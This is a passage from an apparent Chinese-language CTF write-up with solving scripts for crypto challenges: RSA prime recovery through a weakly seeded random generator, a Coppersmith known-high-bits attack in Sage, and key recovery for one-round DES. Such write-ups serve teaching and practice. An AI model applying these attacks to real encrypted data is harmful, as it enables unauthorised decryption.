class="built_in">int</span>(m[<span class="number">0</span>]),<span class="built_in">int</span>(m[<span class="number">1</span>]))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(d).encode())</span><br><span class="line">r = p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">########第二关########</span></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>.encode())</span><br><span class="line">r = p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;1_msg1.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">p.sendline(f1.read())</span><br><span class="line">r = p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;1_msg2.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">p.sendline(f2.read())</span><br><span class="line">r = p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>
<h3 id="chaos-generator"><a href="#chaos-generator" class="headerlink" title="chaos_generator"></a>chaos_generator</h3><p>下载源码，分析逻辑发现是利用chaos_maker模块生成了两个伪随机数，并利用两个伪随机数生成了两个大质数来执行RSA加密操作。该算法的最大漏洞为chaos_maker中定义的随机数种子seed只使用了一次（给x赋初值）。在传入相同范围(0, 1&lt;&lt;64)时，无论该模块中将$g^x\space mod \space p$​迭代多少次，产生的伪随机数只可能是有限种，而输出的大素数也只有有限种。</p>
<p>因此直接利用加密脚本进行随机数碰撞，运行几次即可碰撞得到本题中使用的N，同时知道N的分解pp和qq。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod,n2s</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chaos_maker</span>(<span class="params">p, g, seed</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    x = seed</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(randint(<span class="number">0</span>, <span class="number">114514</span>)):</span><br><span class="line">        x = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">        <span class="keyword">if</span> x &lt; (p-<span class="number">1</span>) // <span class="number">2</span>:</span><br><span class="line">            res -= (<span class="number">1</span> &lt;&lt; i) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> x &gt; (p-<span class="number">1</span>) // <span class="number">2</span>:</span><br><span class="line">            res += (<span class="number">1</span> &lt;&lt; i) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res ^= (<span class="number">1</span> &lt;&lt; i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> res <span class="keyword">if</span> res &gt; <span class="number">0</span> <span class="keyword">else</span> -res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">p, g</span>):</span><br><span class="line">    u, v = chaos_maker(p, g, randint(<span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">64</span>)), chaos_maker(p, g, randint(<span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">64</span>))</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    执行随机数碰撞</span></span><br><span class="line"><span class="string">    print(u)</span></span><br><span class="line"><span class="string">    print(v)</span></span><br><span class="line"><span class="string">    print(next_prime(u**2 + v**2))</span></span><br><span class="line"><span class="string">    print(next_prime(2*u*v))</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> next_prime(u**<span class="number">2</span> + v**<span class="number">2</span>) * next_prime(<span class="number">2</span>*u*v)</span><br><span class="line"></span><br><span class="line">p = <span class="number">74318463376311964657848870236469351222861371046000989980725143814597652972079</span></span><br><span class="line">g = <span class="number">10135979321704650132001133858909900216529170765388975908180263641843583056994</span></span><br><span class="line">N = keygen(p, g)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"></span><br><span class="line">pp = <span class="number">8060224167508953559985795829105353706264995426539040211450848476875819847783411399182952191088483169979850012499608700022085398954278777225222262273498079</span></span><br><span class="line">qq = <span class="number">5776606591131731176687221654555806721589749446513729573168881347635227133113794767302741712092017955351737968930616386238529534813063208506333298381433797</span></span><br><span class="line">c = <span class="number">23334367507777982721463578689282517343702422017568936413397591619899938216343800551132594869485665306596562901129144338015710969994575939792628945297846703002122172051500112438041566171992504143239954624689779597268840813422509867439815100802585538453946245512563984478922752113443379737653491922857109660034</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invmod(e,(pp-<span class="number">1</span>)*(qq-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,pp*qq)</span><br><span class="line"><span class="built_in">print</span>(n2s(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>考察的是RSA中的Coppersmith已知高位攻击。<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d8d2ce53041b">https://www.jianshu.com/p/d8d2ce53041b</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line">&gt;&gt;sage:</span><br><span class="line">n = <span class="number">81990486158830819987073862172415164961593278461441199000999472465202518599850332550812125141470698747706547832071653895197966292731285323989845213159146261837803561813706450672725878328449137240949801181034766354744732582372151328001276074276010039350214840101550595192803830418941509645225250637084951191901</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">m = randrange(n)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">epsilon = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = floor(nbits*(beta^<span class="number">2</span>/e-epsilon))</span><br><span class="line"> </span><br><span class="line">mbar = <span class="number">10209587263099434303402268295264783241039304732220412954880929680985232124926643894842588590120872193397691703623680</span></span><br><span class="line">c = <span class="number">29567745406946076830146052374930033424211480116321544674448562777091588294881623860014915348606939136520110465290092616212926800744828796888106944346222024613999754846412634549763305673101149427233979469362411909357450400895307369148973536710380608978693814012874175410588472106640257194122351943446376090522</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;upper %d bits (of %d bits) is given&quot;</span> % (nbits-kbits, nbits))</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n1</span></span><br><span class="line">&gt;&gt;endsage</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n2s(mbar + x0))</span><br></pre></td></tr></table></figure>
<h3 id="ez-des"><a href="#ez-des" class="headerlink" title="ez_des"></a>ez_des</h3><p>下载题目附件，发现题中的DES只有一轮，只需根据给出的五组明文密文破解出密钥即可。使用DES中间相遇攻击，选取一组明文按照规律求出Sbox输出值，进而测试每一组Sbox可能的输入值并计算密钥，利用其他明文验证可得到准确的密钥。由于原有flag求ASCII转二进制后共有49位，求得48位密钥后最后一位还要测试0或1。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####################  分开合并  #####################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">message,length</span>):</span><br><span class="line">    bitstream = <span class="built_in">bin</span>(message)[<span class="number">2</span>:].zfill(length)</span><br><span class="line">    left = bitstream[:(length // <span class="number">2</span>)]</span><br><span class="line">    right = bitstream[(length // <span class="number">2</span>):]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+left,<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+right,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attach</span>(<span class="params">left,right,length</span>):</span><br><span class="line">    bitleft = <span class="built_in">bin</span>(left)[<span class="number">2</span>:].zfill(length // <span class="number">2</span>)</span><br><span class="line">    bitright = <span class="built_in">bin</span>(right)[<span class="number">2</span>:].zfill(length // <span class="number">2</span>)</span><br><span class="line">    bitstream = bitleft + bitright</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+bitstream,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">####################  IP置换  #####################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP_sub</span>(<span class="params">message</span>):</span><br><span class="line">    bitstream = <span class="built_in">bin</span>(message)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    IPbox = [<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(IPbox)):</span><br><span class="line">        result += bitstream[IPbox[i]-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+result,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP_sub_reverse</span>(<span class="params">message</span>):</span><br><span class="line">    bitstream = <span class="built_in">bin</span>(message)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    IP_revbox = [<span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,<span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,<span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,<span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span>]</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(IP_revbox)):</span><br><span class="line">        result += bitstream[IP_revbox[i]-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+result,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">####################  F函数  #####################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E_sub</span>(<span class="params">message</span>):</span><br><span class="line">    bitstream = <span class="built_in">bin</span>(message)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    Ebox = [<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Ebox)):</span><br><span class="line">        result += bitstream[Ebox[i]-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+result,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">S_sub_rev</span>(<span class="params">message</span>):</span><br><span class="line">    bitstream = <span class="built_in">bin</span>(message)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    b0 = bitstream[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    b1 = bitstream[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">    b2 = bitstream[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">    b3 = bitstream[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line">    b4 = bitstream[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">    b5 = bitstream[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">    b6 = bitstream[<span class="number">24</span>:<span class="number">28</span>]</span><br><span class="line">    b7 = bitstream[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">    Sbox0 = [[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>],[<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>],[<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>],[<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>]]</span><br><span class="line">    Sbox1 = [[<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>],[<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>],[<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>],[<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>]]</span><br><span class="line">    Sbox2 = [[<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>],[<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>],[<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>]]</span><br><span class="line">    Sbox3 = [[<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>],[<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>],[<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>]]</span><br><span class="line">    Sbox4 = [[<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span 